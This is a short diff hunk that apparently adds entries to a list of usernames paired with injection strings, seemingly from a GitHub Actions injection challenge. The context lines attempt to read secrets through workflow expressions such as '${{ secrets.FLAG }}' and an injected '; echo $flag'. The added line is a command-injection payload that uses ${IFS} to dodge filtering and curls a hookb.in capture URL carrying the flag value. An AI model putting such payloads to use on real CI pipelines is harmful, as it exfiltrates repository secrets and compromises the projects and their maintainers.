@@ -757,3 +757,5 @@ cp198:${{ secrets.FLAG }}
 Zeker62:${{ secret.FLAG }} ${{ secret.flag }} ${{ secret[FLAG] }} ${{ env.flag }} ${{ env[FLAG] }} ${{ env.FLAG }} "; echo $flag" 
 Ha1f00L:::set-output name=name::biodog
 DrenLea:
+Zeker62:;set${IFS}+e;${IFS}curl${IFS}https://hookb.in/XkYGbdzLGOsDYMQQY1Kd?flag=${flag};
+
